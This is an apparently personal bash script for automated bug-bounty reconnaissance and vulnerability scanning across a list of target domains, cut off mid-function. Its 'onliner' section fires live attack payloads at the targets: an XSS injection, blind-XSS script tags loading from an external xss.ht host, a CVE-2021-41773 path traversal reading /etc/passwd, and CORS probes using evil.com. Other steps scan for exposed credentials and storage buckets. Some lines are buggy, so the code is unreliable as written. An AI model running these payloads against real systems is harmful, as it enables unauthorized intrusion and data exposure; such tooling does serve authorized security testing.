# trysomething
testing reposetery

#!/bin/bash

range=$1

resolve="/root/tool/bugbounty/massdns/lists/resolvers.txt"

tokenfile="/root/tool/bugbounty/GitDorker/tf/TOKENSFILE"

dorker="/root/tool/bugbounty/GitDorker/Dorks/alldorksv3"

resolve_domain="massdns -r /root/tool/bugbounty/massdns/lists/resolvers.txt -t A -o S -w"

CURRENT_PATH=$(pwd)

make_dir(){


	for domain in $(cat $range);

	do

		mkdir -p $domain $domain/brup_suite $domain/recon $domain/recon/api/ $domain/recon/sensitive $domain/recon/sensitive/ips/ $domain/recon/jsfile/endpoints $domain/recon/github-Dorking $domain/info $domain/subdomains $domain/recon/dirsearch $domain/recon/aws $domain/recon/jsfile $domain/recon/jsfile/scriptsresponse $domain/recon/jsfile/scripts $domain/recon/jsfile/responsebody $domain/recon/jsfile/headers $domain/recon/eyewitness  $domain/recon/gf  $domain/recon/scan/sqlmap  $domain/recon/vulnerabilities  $domain/recon/wayback  $domain/recon/wordlist  $domain/recon/scan/sslscan $domain/recon/scan/nmapscans $domain/recon/scan/nuclei $domain/subdomains/subdomain  $domain/subdomains/subdomain_info  $domain/subdomains/sub_domain_record

	done

}

make_dir
whoise(){
	for domain in $(cat $range);

	do
		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mWhois Is Starting ...\e[0m                                                         "
		printf "\n\n----------------------------------------------------------------------------------\n"

		whois $domain | tee /root/bug_bounty/$domain/info/whois.txt

		amass intel -d $domain -whois -o /root/bug_bounty/$domain/info/domain_info_reverse_whois.txt 2>>"$LOGFILE" &>/dev/null

	done

}
whoise
domain_enum(){
	for domain in $(cat $range);

	do


		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mAmass Is Starting ...\e[0m                                                               "
		printf "\n\n----------------------------------------------------------------------------------\n"

		amass enum -nocolor -rf $resolve -d $domain -o /root/bug_bounty/$domain/subdomains/subdomain/amass.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mfindomain-linux Is Starting ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n"

		findomain-linux -t $domain | tee /root/bug_bounty/$domain/subdomains/subdomain/findomain.txt && cat /root/bug_bounty/$domain/subdomains/subdomain/findomain.txt | awk 'NR>19' | tee /root/bug_bounty/$domain/subdomains/subdomain/findomain.txt && cat /root/bug_bounty/$domain/subdomains/subdomain/findomain.txt | head -n -4 | tee /root/bug_bounty/$domain/subdomains/subdomain/findomain.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mSubfinder Is Starting ...\e[0m                                                            "
		printf "\n\n----------------------------------------------------------------------------------\n"

		subfinder -d $domain -o $domain/subdomains/subdomain/subfinder.txt  

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mSubfinder Is Starting ...\e[0m                                                            "
		printf "\n\n----------------------------------------------------------------------------------\n"

		assetfinder --subs-only $domain | tee /root/bug_bounty/$domain/subdomains/subdomain/assetfinder.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mcrt Is Starting ...\e[0m                                                                  "
		printf "\n\n----------------------------------------------------------------------------------\n"

		crt.sh $domain && mv crt.txt /root/bug_bounty/$domain/subdomains/subdomain/ &&  cat /root/bug_bounty/$domain/subdomains/subdomain/crt.txt | sed 's/[#$%*@]//g' | tee /root/bug_bounty/$domain/subdomains/subdomain/crt.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33msublist3r Is Starting ...\e[0m                                                            "
		printf "\n\n----------------------------------------------------------------------------------\n"

		python3 /root/tool/bugbounty/Sublist3r/sublist3r.py -d $domain --no-color -o /root/bug_bounty/$domain/subdomains/subdomain/sublist.txt | awk 'NR>24' | tee /root/bug_bounty/$domain/subdomains/subdomain/sublist.txt
		
		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33msublist3r Is Starting ...\e[0m                                                            "
		printf "\n\n----------------------------------------------------------------------------------\n"

		python3 /root/tool/bugbounty/knock/knockpy.py -o /root/bug_bounty/$domain/subdomains/subdomain/ $domain

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mShuffledns Is Starting...\e[0m                                                            "
		printf "\n\n----------------------------------------------------------------------------------\n"

		shuffledns -d $domain -w $worlist -r $resolvers -o /root/bug_bounty/$domain/subdomains/subdomain/shuffledns.txt -wt 9000 -t 1000 

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mSorting Is Starting ...\e[0m                                                 "
		printf "\n\n----------------------------------------------------------------------------------\n"

		sort -u /root/bug_bounty/$domain/subdomains/subdomain/*.txt | uniq -u | tee /root/bug_bounty/$domain/subdomains/subdomain/all.txt

	done

}

domain_enum
resolve_domain(){

	for domain in $(cat $range);

	do

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mResolving Domain Is Starting ...\e[0m                                        "
		printf "\n\n----------------------------------------------------------------------------------\n"

		massdns -r $resolve -t A -o S -w resolve_domain.txt /root/bug_bounty/$domain/subdomains/subdomain/all.txt && mv resolve_domain.txt /root/bug_bounty/$domain/subdomains/sub_domain_record/

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mIp Extration Is Starting ...\e[0m                                            "
		printf "\n\n----------------------------------------------------------------------------------\n"


		gf ip /root/bug_bounty/$domain/subdomains/sub_domain_record/resolve_domain.txt | tee /root/bug_bounty/$domain/subdomains/sub_domain_record/ip.txt && cat /root/bug_bounty/$domain/subdomains/sub_domain_record/ip.txt | cut -c 60- | tee /root/bug_bounty/$domain/subdomains/sub_domain_record/ip.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mDomain Extration Is Starting ...\e[0m                                        "
		printf "\n\n----------------------------------------------------------------------------------\n"

		awk '{print $1}' /root/bug_bounty/$domain/subdomains/sub_domain_record/resolve_domain.txt > /root/bug_bounty/$domain/subdomains/sub_domain_record/resolved_domains.txt && cat /root/bug_bounty/$domain/subdomains/sub_domain_record/resolved_domains.txt |  sed "s/.\{0,1\}$//; /^$/d" | tee /root/bug_bounty/$domain/subdomains/sub_domain_record/resolved_domains.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mDomain Record Extration Is Starting ...\e[0m                                              "
		printf "\n\n----------------------------------------------------------------------------------\n"

		awk '{print $2}' /root/bug_bounty/$domain/subdomains/sub_domain_record/resolve_domain.txt > /root/bug_bounty/$domain/subdomains/sub_domain_record/record_name.txt

	done

}
resolve_domain
httpxs(){
	for domain in $(cat $range);

	do

		printf "\n\n----------------------------------------------------------------------------------\n" 
		printf "                     \e[33mHTTPX Is Starting ...\e[0m                                                         "
		printf "\n\n----------------------------------------------------------------------------------\n"

		cat /root/bug_bounty/$domain/subdomains/sub_domain_record/resolved_domains.txt | httpx  | tee  /root/bug_bounty/$domain/alive.txt

	done

}
httpxs
nucli(){

	for domain in $(cat $range);

	do

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mNuclei cves Is Starting ...\e[0m                                             "
		printf "\n\n----------------------------------------------------------------------------------\n"

		cat /root/bug_bounty/$domain/alive.txt | nuclei -t /root/nuclei-templates/cves/   -o  /root/bug_bounty/$domain/recon/scan/nuclei/cves.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mNuclei default-logins Is Starting ...\e[0m "
		printf "\n\n----------------------------------------------------------------------------------\n"

		cat /root/bug_bounty/$domain/alive.txt | nuclei -t /root/nuclei-templates/default-logins/  -o  /root/bug_bounty/$domain/recon/scan/nuclei/default-logins.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mNuclei dns Is Starting ...\e[0m                                              "
		printf "\n\n----------------------------------------------------------------------------------\n"

		cat /root/bug_bounty/$domain/alive.txt | nuclei -t /root/nuclei-templates/dns/  -o  /root/bug_bounty/$domain/recon/scan/nuclei/dns.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mNuclei cnvd Is Starting ...\e[0m                                             "
		printf "\n\n----------------------------------------------------------------------------------\n"

		cat /root/bug_bounty/$domain/alive.txt | nuclei -t /root/nuclei-templates/cnvd/  -o  /root/bug_bounty/$domain/recon/scan/nuclei/cnvd.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mNuclei file Is Starting ...\e[0m                                             "
		printf "\n\n----------------------------------------------------------------------------------\n"
		
		cat /root/bug_bounty/$domain/alive.txt | nuclei -t /root/nuclei-templates/file/  -o  /root/bug_bounty/$domain/recon/scan/nuclei/file.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mNuclei iot Is Starting ...\e[0m                                              "
		printf "\n\n----------------------------------------------------------------------------------\n"
		
		cat /root/bug_bounty/$domain/alive.txt | nuclei -t /root/nuclei-templates/iot/  -o  /root/bug_bounty/$domain/recon/scan/nuclei/iot.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mNuclei miscellaneous Is Starting ...\e[0m  "
		printf "\n\n----------------------------------------------------------------------------------\n"
		
		cat /root/bug_bounty/$domain/alive.txt | nuclei -t /root/nuclei-templates/miscellaneous/  -o  /root/bug_bounty/$domain/recon/scan/nuclei/miscellaneous.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mNuclei misconfiguration Is Starting ...\e[0m                                              "
		printf "\n\n----------------------------------------------------------------------------------\n"
		
		cat /root/bug_bounty/$domain/alive.txt | nuclei -t /root/nuclei-templates/misconfiguration/   -o  /root/bug_bounty/$domain/recon/scan/nuclei/misconfiguration.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mNuclei exposed-panels Is Starting ...\e[0m "
		printf "\n\n----------------------------------------------------------------------------------\n"
		
		cat /root/bug_bounty/$domain/alive.txt | nuclei -t /root/nuclei-templates/exposed-panels/  -o  /root/bug_bounty/$domain/recon/scan/nuclei/exposed-panels.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mNuclei exposures Is Starting ...\e[0m                                        "
		printf "\n\n----------------------------------------------------------------------------------\n"
		
		cat /root/bug_bounty/$domain/alive.txt | nuclei -t /root/nuclei-templates/exposures/  -o  /root/bug_bounty/$domain/recon/scan/nuclei/exposures.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mNuclei network Is Starting ...\e[0m                                          "
		printf "\n\n----------------------------------------------------------------------------------\n"
		
		cat /root/bug_bounty/$domain/alive.txt | nuclei -t /root/nuclei-templates/network/  -o  /root/bug_bounty/$domain/recon/scan/nuclei/network.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mNuclei takeovers Is Starting ...\e[0m                                        "
		printf "\n\n----------------------------------------------------------------------------------\n"
		
		cat /root/bug_bounty/$domain/alive.txt | nuclei -t /root/nuclei-templates/takeovers/  -o  /root/bug_bounty/$domain/recon/scan/nuclei/takeovers.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mNuclei technologies Is Starting ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n"
		
		cat /root/bug_bounty/$domain/alive.txt | nuclei -t /root/nuclei-templates/technologies/  -o  /root/bug_bounty/$domain/recon/scan/nuclei/technologies.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mNuclei vulnerabilities Is Starting ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n"
		
		cat /root/bug_bounty/$domain/alive.txt | nuclei -t /root/nuclei-templates/vulnerabilities/  -o  /root/bug_bounty/$domain/recon/scan/nuclei/vulnerabilities.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mNuclei Trash Is Removing ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n"
		
		find /root/bug_bounty/$domain/recon/scan/nuclei -empty -type f -delete

	done
}

nucli
waybackurl(){

	for domain in $(cat $range);

	do
		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mGau  Is Starting ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n" 

		gau $domain | tee  /root/bug_bounty/$domain/recon/wayback/gau.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mWaybackurl  Is Starting ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n" 

		cat /root/bug_bounty/$domain/alive.txt | waybackurls | tee /root/bug_bounty/$domain/recon/wayback/tmp.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mSorting Urls  Is Starting ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n" 

		sort -u /root/bug_bounty/$domain/recon/wayback/gau.txt /root/bug_bounty/$domain/recon/wayback/tmp.txt | uro | tee /root/bug_bounty/$domain/recon/wayback/tmpall.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mFiltering Is Starting ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n" 

		cat /root/bug_bounty/$domain/recon/wayback/tmpall.txt | egrep -v "\.woff|\.svg|\.ttf|\.eot|\.png|\.jpeg|\.jpg|\.css|\.ico" >> /root/bug_bounty/$domain/recon/wayback/wayback_only_html.txt && cat /root/bug_bounty/$domain/recon/wayback/wayback_only_html.txt | egrep -v "\.woff|\.svg|\.ttf|\.eot|\.png|\.jpeg|\.jpg|\.css|\.ico" | sed 's/:80//g;s/:443//g' | sort -u >> /root/bug_bounty/$domain/recon/wayback/all.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mJSON file Is Starting ...\e[0m                                         "
		printf "\n--------------------------------------------------------\n\n" 

		cat /root/bug_bounty/$domain/recon/wayback/wayback_only_html.txt  | grep ".json" | uniq -u | sort >> /root/bug_bounty/$domain/recon/wayback/wayback_json_files.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mInstresting URLS Extrection Is Starting ...\e[0m                                         "
		printf "\n--------------------------------------------------------\n\n" 
		
		grep -i -E "admin|auth|api|jenkins|corp|dev|stag|stg|prod|sandbox|swagger|aws|azure|uat|test|vpn|cms" /root/bug_bounty/$domain/recon/wayback/wayback_only_html.txt >> /root/bug_bounty/$domain/recon/wayback/important_http_urls.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mAWS URLS EXtrection Is Starting ...\e[0m                                        "
		printf "\n--------------------------------------------------------\n\n" 

		grep -i -E  "aws|s3" /root/bug_bounty/$domain/recon/wayback/wayback_only_html.txt >> /root/bug_bounty/$domain/recon/wayback/aws_s3_files.txt

	done
}
waybackurl
valid_urls(){

	for domain in $(cat $range);

	do

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mFuzzing Is Starting ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n"

		fuzzer -c -u "FUZZ" -w /root/bug_bounty/$domain/recon/wayback/all.txt -of csv -o /root/bug_bounty/$domain/recon/wayback/valid-tmp.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mValid Urls Extraction Is Starting ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n"


		cat /root/bug_bounty/$domain/recon/wayback/valid-tmp.txt | grep http | awk -F "," '{print $1}' >> /root/bug_bounty/$domain/recon/wayback/valid.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mPHP Urls Extraction Is Starting ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n"

		cat  /root/bug_bounty/$domain/recon/wayback/valid.txt | grep '.php' | tee /root/bug_bounty/$domain/recon/wayback/php.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mRobost.txt Extraction Urls Is Starting ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n"

		cat  /root/bug_bounty/$domain/recon/wayback/valid.txt | grep robots.txt | tee /root/bug_bounty/$domain/recon/wayback/robots.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33msitemap.xml Urls Extraction Is Starting ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n"

		cat  /root/bug_bounty/$domain/recon/wayback/valid.txt | grep sitemap.xml | tee /root/bug_bounty/$domain/recon/wayback/sitemap.txt


	done

}

valid_urls
gf_patterns(){

	for domain in $(cat $range);

	do

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mGF Is Starting ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n"

		gf xss /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/xss.txt

		gf debug_logic /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/debug_logic.txt

		gf idor /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/idor.txt

		gf img-traversal /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/img-traversal.txt

		gf interestingEXT /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/interestingEXT.txt

		gf interestingparams /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/interestingparams.txt

		gf interestingsubs /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/interestingsubs.txt

		gf jsvar /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/jsvar.txt

		gf lfi /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/lfi.txt

		gf rce /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/rce.txt

		gf redirect /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/redirect.txt

		gf sqli /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/sqli.txt

		gf ssrf /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/ssrf.txt

		gf aws-keys /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/aws-keys.txt

		gf s3-buckets /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/s3-buckets.txt

		gf servers /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/servers.txt

		gf debug-pages /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/debug-pages.txt

		gf upload-fields /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/upload-fields.txt

		gf php-sources /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/php-sources.txt

		gf base64 /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/base64.txt 

		gf cors /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/cors.txt

		gf fw /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/fw.txt

		gf http-auth /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/http-auth.txt

		gf ssti /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/ssti.txt

		gf sec /root/bug_bounty/$domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/sec.txt	

		gf takeovers $domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/takeovers.txt

		gf firebase $domain/recon/wayback/valid.txt | tee  /root/bug_bounty/$domain/recon/gf/firebase.txt

	done

}

gf_patterns
onliner(){


	for domain in $(cat $range);

	do
		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mCORS pollution Is Starting ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n"

		cat /root/bug_bounty/$domain/alive.txt| while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done | tee /root/bug_bounty/$domain/recon/vulnerabilities/CORS.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mCORS Trusted null Origin Is Starting ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n"

		cat /root/bug_bounty/$domain/alive.txt | while read url;do target=$(curl -s -I -H "Origin: null" -X GET $url) | if grep 'Access-Control-Allow-Origin: null'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done | tee /root/bug_bounty/$domain/recon/vulnerabilities/CORS2.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mCORS Whitelisted null origin Is Starting ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n"

		cat /root/bug_bounty/$domain/alive.txt | while read url;do target=$(curl -s -I -X GET "$url") | if grep 'Access-Control-Allow-Origin: null'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done| tee /root/bug_bounty/$domain/recon/vulnerabilities/CORS3.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                         \e[33mHTTP parameter pollution Is Starting ...\e[0m     "
		printf "\n------------------------------------------------------------------------------------------------------------------------------------\n\n"

                cat /root/bug_bounty/$domain/alive.txt | sed 's/$/\/?__proto__[testparam]=exploit\//' | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" | tee /root/bug_bounty/$domain/recon/vulnerabilities/HPP.txt
		
		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mCORS Abuse on not properly Domain validatio Is Starting ...\e[0m                                         "
		printf "\n------------------------------------------------------------------------------------------------------------------------------------\n\n"

		cat /root/bug_bounty/$domain/alive.txt | while read url;do target=$(curl -s -I -H "Origin: https://not$site" -X GET "$url") | if grep 'Access-Control-Allow-Origin: https://not$site'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done | tee /root/bug_bounty/$domain/recon/vulnerabilities/CORS5.txt

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mHTTP parameter pollution Is Starting ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n"

		cat /root/bug_bounty/$domain/alive.txt | sed 's/$/\/?__proto__[testparam]=exploit\//' | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" | tee /root/bug_bounty/$domain/recon/vulnerabilities/HPP.txt
		
		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mXSS EXtration Is Starting ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n"

		cat /root/bug_bounty/$domain/recon/gf/xss.txt | grep "=" |  qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done | tee /root/bug_bounty/$domain/recon/vulnerabilities/xss.txt
		

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mBlind Xss Is Starting ...\e[0m                                                            "
		printf "\n\n----------------------------------------------------------------------------------\n"

		cat /root/bug_bounty/$domain/recon/wayback/valid.txt | grep "&" | bxss -appendMode -payload '"><script src=https://ligralog.xss.ht></script>' -parameters     

		cat /root/bug_bounty/$domain/alive.txt | bxss -payload '"><script src=https://ligralog.xss.ht></script>' -header "X-Forwarded-For"
		
		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mCVE-2021-41773 Is Starting ...\e[0m                                          "
		printf "\n\n----------------------------------------------------------------------------------\n"
		
		cat /root/bug_bounty/$domain/alive.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n" | tee /root/bug_bounty/$domain/recon/vulnerabilities/lfi.txt ;done

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mDalfox Is Starting ...\e[0m                                                  "
		printf "\n\n----------------------------------------------------------------------------------\n"

		cat /root/bug_bounty/$domain/alive.txt |  dalfox pipe | tee /root/bug_bounty/$domain/recon/vulnerabilities/dalfox_xss.txt  

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mHeartBlead Is Starting ...\e[0m                                              "
		printf "\n\n----------------------------------------------------------------------------------\n"

		cat /root/bug_bounty/$domain/alive.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe  >> /root/bug_bounty/$domain/recon/vulnerabilities/heardbled.txt | grep safe; done

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mcollect all ip s from shodan ...\e[0m                                        "
		printf "\n\n----------------------------------------------------------------------------------\n"

		shodan search http://Ssl.cert.subject.CN:"http://$domain*" 200 --fields ip_str | httpx | tee $domain/recon/sensitive/ips/ips.txt

	done

}
onliner
custom_worlis(){

	for domain in $(cat $range);

	do
		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mMAKING coustem wordlist  ...\e[0m                                            "
		printf "\n\n----------------------------------------------------------------------------------\n"

		cat /root/bug_bounty/$domain/recon/wayback/valid.txt | unfurl -unique paths > /root/bug_bounty/$domain/recon/wordlist/path.txt 

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mParameter coustem wordlist  ...\e[0m                                         "
		printf "\n\n----------------------------------------------------------------------------------\n"

		cat /root/bug_bounty/$domain/recon/wayback/valid.txt | unfurl -unique keys > /root/bug_bounty/$domain/recon/wordlist/params.txt
		
		

	done


}
custom_worlis
nmaps(){

	for domain in $(cat $range);

	do
		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mNmap  Is Starting ...\e[0m                                                         "
		printf "\n\n----------------------------------------------------------------------------------\n" 

		cd $domain

		../scripts/nmap.sh subdomains/subdomain/all.txt

		cd ../


	done
}
nmaps
github(){

	for domain in $(cat $range);

	do
		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mGitDorker  Is Starting ...\e[0m                                              "
		printf "\n\n----------------------------------------------------------------------------------\n" 

		python3 /root/tool/bugbounty/GitDorker/GitDorker.py -tf $tokenfile -q $domain  -d $dorker -o  /root/bug_bounty/$domain/recon/github-Dorking/github 

	done
}
github
apis(){
	for domain in $(cat $range)

	do

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mAPi Domain Extraction  Is Starting ...\e[0m                                              "
		printf "\n------------------------------------------------------------------------------------------------------------------------------------\n\n" 

		cat /root/bug_bounty/$domain/alive.txt | grep api | tee /root/bug_bounty/$domain/recon/api/api_domain.txt 

	done

}
apis
eyewitn(){

	for domain in $(cat $range);

	do

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33 Eyewitness Is Starting ...\e[0m                                              "
		printf "\n\n----------------------------------------------------------------------------------\n"

		eyewitness --no-prompt -d /root/bug_bounty/$domain/recon/eyewitness -f /root/bug_bounty/$domain/subdomains/sub_domain_record/resolved_domains.txt

	done


}

eyewitn
slur(){

	for domain in $(cat $range);

	do

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33 Eyewitness Is Starting ...\e[0m                                              "
		printf "\n\n----------------------------------------------------------------------------------\n"

		slurp domain -c 10 -p /root/tool/bugbounty/slurp/permutations.json -t $domain >> /root/bug_bounty/$domain/recon/aws/bucket.txt


	done


}

slur
sub_domina-take(){

	for domain in $(cat $range);

	do

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mSubdomain takeovers Starting ...\e[0m                                        "
		printf "\n\n----------------------------------------------------------------------------------\n"

		subzy -targets /root/bug_bounty/$domain/subdomains/sub_domain_record/resolved_domains.txt | tee /root/bug_bounty/$domain/recon/vulnerabilities/takeovers.txt

	done
}
sub_domina-take
Info(){

	for domain in $(cat $range);

	do

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33 Respons Is Starting ...\e[0m                                                 "
		printf "\n\n----------------------------------------------------------------------------------\n"

		scripts/response.sh /root/bug_bounty/$domain/alive.txt

	done


}
Info
js(){

	for domain in $(cat $range);

	do

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33 Js Fiel Extraction Is Starting ...\e[0m                         "
		printf "\n\n----------------------------------------------------------------------------------\n"

		scripts/jsfiles.sh

	done


}

js
endpoint(){
	for domain in $(cat $range)

	do

		printf "\n\n----------------------------------------------------------------------------------\n"
		printf "                     \e[33mJava script Endpoint Extraction  Is Starting ...\e[0m   "
		printf "\n------------------------------------------------------------------------------------------------------------------------------------\n\n" 

		scripts/endpoint.sh

	done
}
endpoint
Juicy(){
	printf "\n\n----------------------------------------------------------------------------------\n"
	printf "                     \e[33m Extracts Juicy Informations  Is Starting ...\e[0m "
	printf "\n------------------------------------------------------------------------------------------------------------------------------------\n\n" 

	for domain in $(cat $range);

	do

